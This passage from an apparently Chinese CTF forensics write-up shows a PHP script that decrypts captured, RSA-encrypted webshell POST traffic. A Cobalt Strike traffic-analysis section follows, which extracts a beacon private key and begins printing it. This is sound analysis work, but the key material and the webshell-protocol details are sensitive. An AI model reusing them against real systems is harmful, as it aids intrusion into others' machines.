vrhGOQDB41hDDi4N/Yb3MRn0PM=|UJKgd4FCzzzMeQEq+w3S17+3d+g9mM3JM2qZWkWHOIF3L/EiWpRhm18DuaWJ7veqQSA5pb3KGH9rKDvj2KHIDTUHl0gCiH1U5qeD+WqXFvLahN5O8ecrfgflUUip1SdE6aL6dYqzyplxF+qy3BVr2dKq+6UYlUiA5Bmn2lXSIyM=|LClEAJBfCO7HMhlu0ASDbetkR7sP4aOx9a/P4P0L5kLeGYrlrK4Qg3ZNl7Fd/gQ8KXAKs90XRE62pfZidMX1A4xj/IokC6nkXCNUIzi0PWPWdCzcBNiswbQtsTZhElecl8RyfaOSvxsiKclTvKbZYfQI5r0p0asBs5gKnK0FpT4=|paMu+DWwNp+5GRSiGn4QfFaS/ffXXKuBgP/qzsixnnBWMeXIVy/HT23Xdoc7/OdlIH8/rBKdrJt+7o6XUAbRGzND9sEuf0Ldh5npWln/EhSkGq+bqt1hDfmwwsoo2GJcNDHBhz6lQq2M4zoa9E9d04T3N/SE+3B7LFb0cxLE8aA=|Cz+hQca9uYZJPPJusvE1G8X12VF5iPFM83nOnszF38XQziVKd+D83N4IvoJPNdJLEtgbycIpg1bo5auK1u9n2Pv8z1jFHoaTzmPgDBFiAAv3NGd0m2vg09QwRxq84PD9Ey0dwT7C1w2e6M9wGJ6DoIhPhZQgvUKMyrmCAVmMo18=|h59BqEgdFq4a1HegvdVKeMWwiwQMQsaSzYOxbNCiPuCRGknF8dHHkQboB65gnjbNBDPVpiVoDBMDV+1sCc1yM8zqC494bDS7iopf/U3BBnZS2wCxeo1x78DUiEgzP6ILomxrhrMY2y5R9IbmhJQVkpiqMhPaCvvHzOZO6Pz9SHg=|gUSFO4uVnPAI4UVTKCdBqH/rD6BZZFPfhsVOzga0ohjOJhXW+pvAu4GSh+3FIGn6cpxBUILbsLjBSgmscqAbKV/nHRnQ8HjQUgnu5YM8KikKJV35OMt1Mo1P/qlF5bwzI969XDtUHtClPkznXuO4HyvGLj0/mJj0IauhxfDKhyU=|jkhijGHqR86l+YGh7fldHrzLfam9LUYfRt2nrqqgeqCoE6KO8khatGkzLPk8QgIjLti6P6d7AwwPdVLX3gsfv6bBhT26qUR1u5+AA8foNt5tH6Ej33OODcnkxcp19eFu+zWRG1zUDkBs5qtCJvZKnpSPFKxJ6Z2g0RAoKF3pqbY=|QayQ2dVrEz8KBgpVQjGRNbpRHgFhVK3e89fEzEKzlclezrZ7CBgjB6/Y0PPYSIeZldFEZficAzHXs+bFHALEMrkJlRMk36FMuqtn0YVs4cVy8AHxjb8QnJD9gsFC6q2EWmRo8w4ZdBvg1xyeg3D0vhOcZgNk78BGoSU2HhHK5xY=|Ncgk0CAlnik6xDFINohB1EqgT7tS8COpia8O9cuvi53lNlQWY4IWG2oZMgzNWeU/m8QL+EGqhrD6IflJDD/hDO/IFC6D2DEjeMofqJ/6sHXAt2lIV129SeUUjGdrxyxeWDtqu6iBDdDBtyfPVfeI/DMYOh46XkR0Wk5nBU2N7+U=|lOxi5A2Z8sa8+aw5rQm0g6gqukXMlwvLV7ykEiGWFRqFqDaRPnkVI8diKsvgBg0Btk94gXt2FX1polSNgIJL3E6GW9loo2OMSGBBg1KJ/6VC/DpLWy44VbZhrUB//hiXo3xua6h2DRDi4h5eFkkf2ZIjGjZBi+AqHQINUbetN54=|DRBn6EF3Eoj+wpOX2xhKhkrypPB+d2+8PyHzXwKL8QmOeaRufeCZ1/7Id4TQPXiRXOYsPDXVLr1tUWAUNfqIQisGxSL8lAgg9LzYNYxRUejuTsP2WmVSO21cYXTPlNYjJDR+BkTtOlAvBBp3fjwhOVlr1khuzAhl2Y799drdSFk=|VIJ6dfEfxNcc1eWhAL0dMWXkGSCnBqv+I+Hqs7mGdK9CG3sMH1LyhIEsYg/UPccftYAPeIqKitOpj4OlNbGQMlf8AIJgFvNceAl7HCwqf/6ggZzfcBx5r4HpCBI3cB2zOOOlX9AFVRcunk3rCZSsaeQ8QGsLC1q/2EImzQqSB5g=&quot;</span>;<br><br><span class="hljs-variable">$pk</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">-----BEGIN PUBLIC KEY-----</span><br><span class="hljs-string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span><br><span class="hljs-string">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span><br><span class="hljs-string">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span><br><span class="hljs-string">LzrcBi88Eu7oZaPANwIDAQAB</span><br><span class="hljs-string">-----END PUBLIC KEY-----</span><br><span class="hljs-string">EOF</span>;<br><br><span class="hljs-variable">$cmds</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$pk</span> = <span class="hljs-title function_ invoke__">openssl_pkey_get_public</span>(<span class="hljs-variable">$pk</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cmds</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">openssl_public_decrypt</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$value</span>), <span class="hljs-variable">$de</span>, <span class="hljs-variable">$pk</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> .= <span class="hljs-variable">$de</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><br><br><span class="hljs-comment">//$_POST[&quot;l6eca85c56d82c&quot;] = [&#x27;Zn4Zj/XIusIg6hgVKeAyHg5YkY0aHpA+sClHd8bYyJwJQWeTKg9O0rWjx4uyNAp3lDxcubak981Mj4z7pGLLMcARQVssILHX6HGKnJoWkB6cNCbfbwI8YqUC1NgEsj5iQtfdIDRCmaczzw6/m+tlohMFoQSrN8SASUQ5FrURdq8=&#x27;, &#x27;ScFasYUe1rnzXnGAXtEEQ1HY5nhBfdQ2DCBkSMc0/UvE1Pw6Gyhlbe9B8m9Sq7H1QXMeFEQw7C/MHVIUFfKwFCEaIeScKV0uwDZAQ6aPPaVlx00zWnp1RLvv4fvh9qMt32NEVK6pH4l+tTSUtGTbjKNM3AHJIPigWgJdxiyIn+8=&#x27;, &#x27;OGIDiLqt55rKrqDCWBal9irWhxdFoTcR/yBdMpuHY6KwQqg40zQb6wLJ7KvMZSWJfI4EcMIchta0oLIaxUy0Mtn6MvUVIo1Kg2OoFyAS2DPlt/2vwN8lSMDmfWSdyv+oAGyE2H068KoB8kX35Wn+LEF2IEMDaOzx2azojkXycXU=&#x27;, &#x27;AQMG1moPhYMGh04jYOhrxI389fD7Er+8lkP+xa4yLZyQk6Zp2DgI/2Mzt9sDRvVRrDm80dzx16o2zNkRiKRAJrK1RQuMl4wuFph5meAoCt+aDe6ct4iX3DHkEveAVikjvIhYg4hQMMwYFZ7t+uP5wtdLs8f2mBCaDqhOCq7OIlY=&#x27;, &#x27;Mriexd4PpivbbGf3p4ALnXtkLufDDcDjQL/y/XLJcwTEsebSlUrSvCR59KZOD+PqVxYY5gxfYPGzoIqCrIsEsMye7OxIAFFn2489rfHzRai3xKJKG5Bj19HnMgX1BPyrypDbKkleEDlkYCYHgE9nH/4CFPXQr362Kxp5TeiMhd4=&#x27;, &#x27;Js7EXmASNJv7vhWlQOjg2c1fypN/R+U/o8xXOY8/SVCmUuz7QRqcc52Qxof3SFD2XxzSRTqnHZdIE27tp5jV2UGHi5Z2jc+gj8UmqTE8VuP6X6FOhUqGC96prfxmbSCMkA/e8mtJsJXiGhjHkRvULnBoTzRlf7/PQaGmnmoKEzs=&#x27;, &#x27;D3AolWpp3tEoJI+zfdYBfonRED1vlE5qh6sJug+wCk9r7PQex1dsFHzMb57+ogMFaXk3Gz7fBnr06PWca6xYzdPHHdVCNO2p1P60sFRS7mvLRs+CBotiEGd9U4ChDQ5yLPO96sSWOo5iVU3rZPeOdNUZW3yyaNZ8r/IynfPMsZQ=&#x27;, &#x27;mTW7v54Iy44qnOyJeXu/oCFVaKOBj06eLi5zxPpe073AO1jn5nwMBR0UK7Xa/bG5NlBfplS3Y3Ll1ya2mvOe+4LIRKgMOXRGejdMb2S93IbCXPqp7XVNrqcrXr95SkJeeEk+zktgD16/WpixUCgs0GFYmGAKSeGaYmdaQ+sDKmk=&#x27;, &#x27;SUwTv5sLFChoUtykcBW1sqi/4Len4YEYM+3VpNR1xbfHHSThR2jjK0TeXPBk9vLVzuWPIpg7ZRAQgoi+OoOeDjoEzmYMw0nuaZvjw6GKZrH+UQlFBZuVZ248ZdvqH1zQCX3tTWM7NxGnPKNqD7JEjS+ixsCGk5Ea7gb88yI1Fz0=&#x27;, &#x27;FNwwTLPWXutIJwqnDwgluIv/Ies/71C8H+UUuG9KuULzXiZYNlbOSfAZu0hT+YD6B2cVN3nA4l5B3zDYU13UiQh9LewNC8KUnBlOPqhZPC57iiXJBETg+FDo9UZswN7JkM6FaZp1osmCtBtP+uPbs9op/nACWTqRDlc3AzmzhC0=&#x27;, &#x27;g/cOJmEmrg1046z5unyLSfag901Dwbiog/06TTgBzbZCxBYzqNMiLpj3q9WzzrzfZpv8Y1sPSwAhbW+6ux7+bH6d+QbgfJK5I5Fxsd/9yweOa04JhWieCRizU8uMm3oWt2ZrvdThgyO0gymm7UTIqeMz8jEnUDh3E7rGI3PcLyI=&#x27;, &#x27;DCAfid4xuUbZvB52YRqDOJ1eZ9oxZOWjUgT5MgDZ8ATlt1kfGrRF8xfu99takkdl0pS52cxzUylyotJFDD2XZ+yDJIM3T9eojj0/o1J1umNxa8oW/rGtzp+dMnGiofpjaaHxxfjwDztbglYPvC4MtsxMxm5EIVqvuWAXDbniCt8=&#x27;, &#x27;PtgveYLNMoPTJbdMLIMUfcKG5xHEuH+0woXkCO8vF25EEH9Kt/TT2M6sIEYvhKJX+geysxkOFMjDEucKQeEPV3E2Xtkzu57QR4yLDnzq07qmYYqBsAXZD9Thon16axBvQdwJ2R21BKEIvfucBKE7lR4DL5idxXCQMZseRh/dFNE=&#x27;, &#x27;R4Te1rFFngYZVODMcwZ8foyk+U0A2Rs6AhwXKI4duiECWGcZhbDKyHkOstfggZceBlMdLDO7zw1C5HqMFWkvDOqawLZL8kl+XGnGoRKZaqZut27l3fB20eW+X/2jk3tgS5XDMkmiTjWfJ0Fns+bpoDZULXO3USMSnrsPy/zeosM=&#x27;, &#x27;QhGblZx2qZpBWU1WNGSb4In1lIEydg4qOKTIDgdSx3jS4YOfV58sgOHcaOzoZK9vEqsKbqjJl+MGShmilwuwZFkolnb73hKAR74RXodHEUonGJcZMpWxanvhe8AqjBUmt2AtIQ/l9fu39l79djKnbw2v5OoBMMSHRomf9iCIgJg=&#x27;, &#x27;RsBFWXfFGbe6QNPs+Bjb2vgWKS1cQ1hCQdnjbfMWXRIlln/z9LNz8TWw1OTY0le8pSKil15yyWVHWu8Z6AgwgGcw/fhHy2JN4m/LsnAtWUR4ae/CLeZxCGs2PMJTI72qAUkhQY22g/4P8pKZN9UuzS9J7o1AmTuBGIULYNOpOrA=&#x27;];</span><br><br><span class="hljs-comment">//$_POST[&quot;u51aea36fa19a7&quot;] = [&#x27;QsXJKJ+HbslLx5m2I3NOeM4bW62m7LWOrDehaEf6XfBjIvU03I5qrX3DPPiIXlovgL85iuAf5Z8vauDIY+tCrNQxaefDg0UuhEVubSB/smQWDfFgbRfKRyF93GFCT2jEkhTO0rH0ohzTCYmMcQh+2Sndhf717fUCzbyI8xmHk2eHZQGs5ICJTAMDGkfS9czxKPO10FO0iDxzJYBWDGan/oMftyDmbC2Y7NSeHJ0G6Lj+RnUg5+NlxQCm3HT8WXs87rNvzb5d+H2YHEP594swVsQKstPKiXSPiPQiIfZRXhpXypNnYxd8YmkLngfDMVhttCWT+NgnVGkHQZ6/sB13TQ==&#x27;, &#x27;lkg5ELvolihY/qU7jRsjXoFqK2eh/6Q/bM/s0L7cAZ9Nz7/99SKe7ez1uCQIaWdEtYrPYaWM0F5JqX/g9S0d8AZlUgg2LmwDJHwR8NLA5LMwohwsaYuIVJ/ojS0c8K1b+qbnrIPO5bzy3VnVaM4kHdmDrEF5FvSbzEx2PmxJSuI=&#x27;, &#x27;njtBworWRl9RQtpVKnNbefSnJdWWSmTPMnSSVBHSCgRTglKsCKF+jeqlhLy1O7Yda/H5hMF6OGMjn+x+bAHVYViWOwPBWRdNZbp8KteJvPfx+8K+X3BpmjmpsrgvS8f9PipgoCaQ5uGCt2MFTHidQ/Dl22Fv+EY54IZpkzv6qMqHZQGs5ICJTAMDGkfS9czxKPO10FO0iDxzJYBWDGan/oMftyDmbC2Y7NSeHJ0G6Lj+RnUg5+NlxQCm3HT8WXs87rNvzb5d+H2YHEP594swVsQKstPKiXSPiPQiIfZRXhpXypNnYxd8YmkLngfDMVhttCWT+NgnVGkHQZ6/sB13TQ==&#x27;, &#x27;LhpEKqCGqIVO3UeoJMKOAld0Je185OIx3yxB277muqA2UIURtPGeskBh7ks2O4Yka1XK3kI/DBs8tNAbRXmDgDov7VhtdH1blRdd5qEnmzzyOQNGEnuDkTPxvmwTWmHGcX4HV4jJ5YkF/6l7t9N6WmV7jjVcnw8iJFhfPlrPEmQ=&#x27;, &#x27;bAV20O86Mjx9jAR+1oTaFUokJgb8WwgG0kcuFomp3Z3oB2PhzdBmPnqgAsczLbw0MgjlomXcswh1ppWX+UTZu1HEriKJ485h7uUSwralQ7AIpuHz0Te7EBk93rB6K9e5z2cVtr9AFS39iGBnGZz6POEfeUPBxr+KPmffIty3+pQ=&#x27;, &#x27;OBlv9+3FmnsXIHz0e0SO5FSUyb5Vzk/lsszyuqgxI3LnyNyQJBLeUYJ6Z/Y+mgPkPVTS3XXbl7dw9r96ise1P0oxQ1OpF3CduihESGhv8hsjsGtyodDVoOXX/IqafSG6A5+RrrSE2QXSu1jR82eaKqz8tirqeDGjxvxQcP8hCHY=&#x27;, &#x27;NP80SyrmGiIns4eM5g+ZxmKrDZeLZ+Po50XYvL6jfnaKUmguyL4zyhmMP2pUc/lJKjAzNBwAuu8nzr59weMtfwWCnxxW+odCniTloqtgjNz4XMfmFMQt9JyXimR7MmAZLslAAVQ3BqZi+o5yAZolhhdWZFZID4eFeWUt90mH6foo3Kwv7cpKoucidOB4WmC+cgQr8J4wV+90ucZMShIACSDWIwzQkWf5ipKYX3TDPpxdx6mB/myr+qSKvJ6cIMj2+C2JcNeMugLFwPcz8FdYAeTNfS99HR2/s2wORcWPvjLgo81GJmY9hEynw0TiN6FsUfTTSXZZQrgawL3hVJihIQ==&#x27;, &#x27;liznpAZwDr08AvagvCka74dg8JEmt11DJA0gqntiVYfGiJXTXDDcwoEFAQjEtilhu/HriqBhs+9MnHHehKNC7dqycC9Zee9QD1Dc3bVHNw+qE8Xo47591rD2V4HieLMyVLPkS226cr2EEjcohq49czicdNuxS1174fJFVT5KaKYqzY8ePpqnDtVgQpOw2COA7Oynj8TMoDBjRdqj15Bi84zw2ccg6Co0MdfCSBKpNx2aXAU9W/3HTQK2o8NbYx0mX1iVQ2rKnUXfGcIzDDI+lQFIelJ5IGBpiCZWhx2otRYOR89UkpGXQ34Om34s4iLtw/X8AMXkO+opsVEzOPJchQ==&#x27;, &#x27;kYmwYioUXSEJdbQGaZNF2F8hELzyhWJt7pTcT0xrMd6wLmD/nKvZTUztFzbvH4ESRmmC+QsncW+vw4hTflc0DkO9g9PCiCp7GjS8aEpIT/9IivgMatu1gQmkQSLiJHSc1Krhgd03LWbHax23GjcXn1Wl8I5DKXeLAst4bx7WWr6HZQGs5ICJTAMDGkfS9czxKPO10FO0iDxzJYBWDGan/oMftyDmbC2Y7NSeHJ0G6Lj+RnUg5+NlxQCm3HT8WXs87rNvzb5d+H2YHEP594swVsQKstPKiXSPiPQiIfZRXhpXypNnYxd8YmkLngfDMVhttCWT+NgnVGkHQZ6/sB13TQ==&#x27;, &#x27;m4CmQPu0sxKIydnnGtkWSfc34mLRJj+Rh7+8nWU2ZF8T2E1u2yBt/JDaSjM+Upa52PjbxQYZ0/V+SnRv3qmARNOpH5Snqjm60YYlMbNH7ajDeojHAMVe7YqQ3gdFThdqEQq1qKBxPfVDPodlbvRDKvy272MxDEPl6hntE+cQedU=&#x27;, &#x27;SpdmQo8YK6Iag/3iNakttTCsmjdZN+VU9AakLngsk00A9jL6e5zyjPF5ePQpXrXxy2ZjSXLfS5J9t7xatfP6Rqjsl/7UQU+jrfgLE9fejXv0mOSDjZuu+4Qaw8eLX0QIbohjkI6eyTHcKBDITcEt2oe6vBG4re29lCopCaXOo+RXtS3zvuPe3777naWT4eyOkZV2dNROvyUlPdUky5ElfEo9qkqr9nQ9UJqOPfRQFw0HV+WkoY6lWCewG8O1kb08iULwTsaiLwq0WFq5gnF0GR1GjhbTDuqPxA0ad97Rkf2U/GVkGlyozThVYOlmsOiWbl73Lq1AUX2MDvN8JIMBDIPAxtO0It5WqDzr1Lmbn6IwxsUtkm9OVkibNNWDnsYu/ZooBtPaeWiR6orGpORfHgWGAJtZJbxFpgecvlwpyET04/co0wwJsleK9h6DQNI786xi9GKHhzkOs9JzeBwO6bPjgGQhhAY+YqOr+A68x7YINw2UOr7f3VaiWP5hWZQlG0X5yVhMVPiYvvcvYBF7/ZafdeifZYG2vYJmtD2kZ9wlTnwFXujUeqMGVHtIIE4RBpAN1nTVxaPlCpDLR7cZBCcWbeEbVgoUco2dFUuq6JUP/lVCRQu/O6A5hlrqYbNP/ZHErvn8V4/oymBeF7BngUkDnPcKL7ueoRVBC2WoYgyVVCy5A4de/gQwBR6qTJi7mCPHr/bA6JWeJDt3iG4y6AY4QcW9/vBrdC39uLgxo2reVljQZ/riC3la70g5DnGTHd/mdo5VYN6PhwHLtya7H1fAlS37/+ybggDyECtO9/RogvrLuI4QWdEFh3aZkavAiYXFdqOfB4tdxgRZCyninwmtSq0Zuylv8O3K0ZZCm1r8fpUhOM/5u5ti8xew2d+RM57rdaXvNSyoqg404M6adNfG6+cyaoHJBGzr4ET6fdO7dkgUt8rsdgW6JztH6epw4XxZ+fiw+jGL5RxXg0xHD9WLNnh02cwWo2FSTPLgowwFvfwGDHjMH/HtgJKROjknhNRrDAW+Uz/RXWkZJoIj1ypbSIhWjVCBsHwc5McpUnfK/iL8wudMkIztSBS9Z9n2SRAIOwgalrnOMuVeS5dNd8WmHzDOC3pQ2rZ/vjy18UIYJkVzxrPw79GHmjSlUWouSs3tQwlQ5WhkK2lGl8vTBLDNJA7R2/O5b2MEz7BDnNA=&#x27;, &#x27;ZiKfh/mdWXeAMBngvBKOGSXMnHdMjBt774kcjbn1cXl6l32kZi6Bv3949cEjAy4PQwQJWlTxmMT+JD0aZ4mkZN9S5lhNZIg1T29KxU/oryNonP0aVoTsYvqgiqjoaPZ6tRzjnNSujojyelHISea7W9ZgFdqHOn3X4/SMNYjo0u0=&#x27;, &#x27;BLHRbtBoY+9jjKwUn3g/6VjqpEGtzEorD2bcNsSnGNTh365TacqwN6vG0ONzTjdHkdd8YhhtPvFsLDAj9Tkn3XRHzCEVFf6oao2xivHpDC0w5e1RniXFpl5DlA2R+XfyxxN0oDHgdtemCCwotSX9/D6TX28nFvmpVPxoX7IBtV5NVSt9nTbnDQp/UEEPKmpH3g8bt4UETFoJ086J9yNOS5J9uHSdmWBa3vQVor0gUay9tb4Gi9YpztDcLD9mA/C8aThpNED3ybAEHF1JK8+So/L3Kw9K+M7uW+9fkFIkUhWxFk9+a+W6fIPR2YDn4IcUmuh6Pw7M2NKzkM+QIyZ/fg==&#x27;, &#x27;nD0ETT7Mzl7+XF5kZhI0pIuONkncH5dNPVGzS5jaAS2Pcpva/SdCkCaRkg4C9s2uZrBEkWWFWM/7gx/tlmJYHM/6cwIlbk9PLJAVcUrw6Ecgx6hiEbP4dWcKg2VSzwacsyozCGeMeZV3LQCGRTfi6ewm/QpW+mujiQH38sj4/N5NVSt9nTbnDQp/UEEPKmpH3g8bt4UETFoJ086J9yNOS5J9uHSdmWBa3vQVor0gUay9tb4Gi9YpztDcLD9mA/C8aThpNED3ybAEHF1JK8+So/L3Kw9K+M7uW+9fkFIkUhWxFk9+a+W6fIPR2YDn4IcUmuh6Pw7M2NKzkM+QIyZ/fg==&#x27;, &#x27;PDMzPKDsBdh0LHO+RJn7G+bShEVxn5hwPb5RfzwLjZIhvHQdWat+S34q+e8G9yfJWrTYg8StP9AjDGyLK/TcWtI6eY+VRGUvUJ4fGMoT09sS6zILqDInOzHrhEHin4IgkowJoF3TFX2KukR38LZgKn5VKi9F7Ue0l2hqeO0IRq8c69F5II1xspprr2YGy3hU9nO38KTUD/4kPbuu8rsit4/BSdJdWv4+xIjEcS11SzTMWemzVGMv/Ax/NiZGtJFCaW3XB0w0M1XWXG8ewGmpj/8u+VzPoDXhWCrYRvsw5mZdQ5FFmHHCU5mtMsI3mGNjnmUnD5IXbV6TfcQmlPrs0w==&#x27;, &#x27;lTtqYzsk9q59ReMvJUcP5fKUYoxfZQS9QmOyjqbBvy/9wAX16xpnqmhUlwHIDNAlz9nIZPCJHjV66Ey/S7px2UW+921Lm1a2YocFcTkDS7zqNqDaoS0cpigSTB4skhRR7pAe43n3CCbvRlF6sI/uOZxUnfg2nXHkhAyDGJsCxgQ=&#x27;];</span><br><br><span class="hljs-comment">//$_POST[&quot;y21db7ea65d36d&quot;] = [&#x27;ZqGizxiHeHVBCCyvo46huPPtI7TBLmoEQP/GX9AGPW1ewqeV+9/LeJVWT1o0ALkFCVj1DDfutzXfrIQdpVh+HBoVUiGjjG8sSRiEPfRJmzAzVxR+9nnwrF4EObavmAA3Hh/0TBtirl+9iUEU8bN5TrnV6Gq5y2RbYeE3Mri2K/0=&#x27;, &#x27;b46b/qgtImXh6TF3gxU2HZHjmKbjhV5WXV5d1wqTANk6v7RKgR/Tq/IzYnIGwduVwwX2mf/kXl2OwqEwmhaqc2xoUK0EytOYe8y+tw+oE8C1AGMVEPVEH/LM77s4iU81SQqr5nPHQjSprv8UQR0tIUfB42JgSuw82SxoR8T3Nc0=&#x27;, &#x27;g8K2XGqaUSdc2og56FbCAgHsAdlcxQajw7hJ5cUOe2ix93yk8MhwnWvAkHcXy/PQG9Da9ScixBzJFw/dnINflq4yLkp8N/07JSZgg7DPLz/o1se4+yMv6H+IP2cD0Q1UU2n4PAEbCtAA60m0kczWz/fE81DbVj6JxgWl+EmElOI=&#x27;, &#x27;Wjero64jDdIPWXLGz1rrNCfjcjJhJlH2NmUIT8WK7thISuS/Bm7RnnFyIC4jnkhuX4ZTtsY3IWuAO41R2JfBcZi5fZlPDLdDn5ojOmm5CRcHacCFy7KTmDtYtSsjD5vzBaKrMfF2tRN8bnd8CT91V6rg40ff2+9HvHjH7BBhXUI=&#x27;, &#x27;aG30z0UroESpnX1CNbp2HS4DrVWrtqOWs1Jpw5ONcWdr64bkB05DdNHpW5Nqh9xVvlJTuVXWyrPc4V12GwmuN4ifN8TtHCq1n4/TnY/BerzzYaXrp89iXXkXmwRUFEqJ+iOVNjAzfdTdnRPaMPtRUFQjugF0U+3AYa9SrnsLrLk=&#x27;, &#x27;QCXq2VxN88Rey14xm35TsRqAj1cbIgKma0PxY2qrJ6DRD8D6JhT0CbF37pQDUyFU1iuBhR/h4tVd/k8PCBRoKOPF2R/1jDol3EQAWLSYZUd8mOCY72XD2wnnltTTHqB26N5nbm6qaGx5fi0PWH++Ds0mrCiJsE2+fMFIXDGCXag=&#x27;, &#x27;kqNJjIRlbVMlD8E5yPJmYBzTNKxSVpKARQOeA2K9SCUeMZEARoaru3aL91Qefzo/fhWCWEwieXyeBZdjE8c1dY73u7D/jneXW68krQXndzrNwFTDQRyiOvZJRREQ7ZNOyDmB7ltpLv+mizWTv/bQezF7sbIh4KswbjXuCj8w0NE=&#x27;, &#x27;BvzvMn7WAaWgqdlyMbUzEzgRDr3PFNgwIClZ3C7JTMMTqhErpNgvrLxHVoNelTJsj9y1VatUKGRir9qs67L++SYMICBLTiu3ZctGtdmsxufbTMYfWr8EbiiDd0bYhPvYbzlHU1MlI+fpEUUrGckC5caeVcHaqNB7tdhDJvFms4E=&#x27;, &#x27;ecC2GvhvXqIFNVLx8g1YPX+VeUOiFKLDHik8NnmrCbPQFtduUwvhiMT2joMHhr5f5fOVi/jpwrlC2yR2jhPDtmIl8nkJqnTd+uBykNguN5moHixbKWMMv8HYejnT7CLGmTxLDzTrQlICua+4O31jOOmDrrLuUdLKI2uaQ1FUAMc=&#x27;, &#x27;Hg8A03izTr7zhommneQYE2d9UO+EpWtU3Q9rYM3YnJf7SkVcw9+NHKno7COU1NVbXiHJjV2bTDcVnAkQeJJqZGXNJfR3kSo3XYlwXZGWatrccd/ADyu7E+Bt4oXtp4pDpafhDJLh40cd6jprQnIYxDYBcs4o6CJjvR7JpOLmC0A=&#x27;, &#x27;YsLUw+DPF6JpxvD0B8blORoPd3xe6y4P0gYWlHgRwnlCRjyS3LlKRbY2lqrtulh/MRz0yGOSYjifa0c4sbqsbIf+ENFXmiqqm3ySPjXWl4z2wdrZMEV4ZXp6VXTxNk6cizDoONBDXXuTziZDB+DAev3+6HHtaI5tspkMVap2ou4=&#x27;, &#x27;GyS1qCDux10wqJhGI7tKn4MTwRiRhAMoN3/DpO2ehtOkp/G0tS1Dhi8tdpWU6OqqtxPs/6G/GqEoC1PU2StQzal0QO06pAXixlMvx1lkHmAOAj7GI5vWnETeyrTUBkGwdRki3+VlvU1eUOVhJLg046EMaJsy5z4Zz7Xn++d1BsM=&#x27;, &#x27;KY2kr0R6yNTgxw40gZEZKGfZslgQEEEOqRADN2skaB+hdfniw7t/eV7YrDbJfkzaPo+oUGbebR4IRPcWgeIYJjtte9h/y/ugcFu2SmZ6PEIp35gin1LKqWehNA9gnXeRVP/zpAD7kmVK5PMfWU32V7lvp6Dn00KdpH5CPHWcQO8=&#x27;, &#x27;IRX0gA23Zu3I8rlcswv+iqJIfs3Kf5jKmiq3FrB0Zcs2N7VfZE7y3qy7/T2OAC98KrO874t0tOLDxhBw6hDz6zKRINRjZLy4cQC1MhUWJG0lqX2cI25ePHfmPUpFnRUzZBBkuP7TqFO+PzJiLA8V9cxe7uWpt2dw/cC11r+k29Y=&#x27;, &#x27;MmCqLxv78f+GCRBM16oPUgQCiSn6yB9O0UuVILu/e0ISAWsXvInQT+VqU3dORntNyV5+VSbrn7u0in1c4PJHz5oH0wVcdwVbeH+K6CLOVF43Pi1HkWiKREECpLKO8ClDkDLeAbZ5SVgSjVuUqVT5f4TOKKSB/EZVnWlIE1PJrH4=&#x27;, &#x27;gyfTIHW5Ov921U8HQ/3qENdIwwMoBm8JJ0KI1XoLBNDDEYLKX8+EGNlNZikwBCOPNiP8FYftgUTQzS5DokJzDm4TG89k49i1In8Oeekdb1phbZkUWpboWv9+VPTEc5VH+wCM/l8FA0wvZsm/iqfwe6grn3C6PUNP+AOo0QcywKw=&#x27;];</span><br><br><br><span class="hljs-comment">//$length = count($_POST[array_key_first($_POST)]);  // 获取任意一个子数组的长度</span><br><span class="hljs-comment">//echo $length; // 16</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//for ($i = 0; $i &lt; $length; $i++) &#123;</span><br><span class="hljs-comment">//    $res = &quot;&quot;;</span><br><span class="hljs-comment">//    openssl_public_decrypt(base64_decode($_POST[&quot;l6eca85c56d82c&quot;][$i]), $de, $pk);</span><br><span class="hljs-comment">//    $res .= base64_decode(substr($de, 2)) . &quot; &quot;;</span><br><span class="hljs-comment">//    openssl_public_decrypt(base64_decode($_POST[&quot;u51aea36fa19a7&quot;][$i]), $de, $pk);</span><br><span class="hljs-comment">//    $res .= base64_decode(substr($de, 2)) . &quot; &quot;;</span><br><span class="hljs-comment">//    openssl_public_decrypt(base64_decode($_POST[&quot;y21db7ea65d36d&quot;][$i]), $de, $pk);</span><br><span class="hljs-comment">//    $res .= base64_decode(substr($de, 2));</span><br><span class="hljs-comment">//    echo $res . &quot;\n&quot;;</span><br><span class="hljs-comment">//&#125;</span><br></code></pre></td></tr></table></figure>

<h3 id="CobalStrike流量分析"><a href="#CobalStrike流量分析" class="headerlink" title="CobalStrike流量分析"></a>CobalStrike流量分析</h3><blockquote>
<p>参考链接：<a target="_blank" rel="noopener" href="https://5ime.cn/cobaltstrike-decrypt.html">https://5ime.cn/cobaltstrike-decrypt.html</a></p>
</blockquote>
<h4 id="密钥对文件的情况"><a href="#密钥对文件的情况" class="headerlink" title="密钥对文件的情况"></a>密钥对文件的情况</h4><p>先从流量包中导出key文件</p>
<p>然后在 cs-scripts中运行 python3 parse_beacon_keys.py 得到私钥</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nix">-----BEGIN PRIVATE KEY-----<br>MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIzAss<span class="hljs-symbol">/1Vcd49UN5XT+pVELCnX1r</span><br>To4LhSzcP7sPOrIOQg0onSpKO1tzOVX<span class="hljs-operator">+</span><span class="hljs-number">2</span>DqtZsSFoFrAmrEV<span 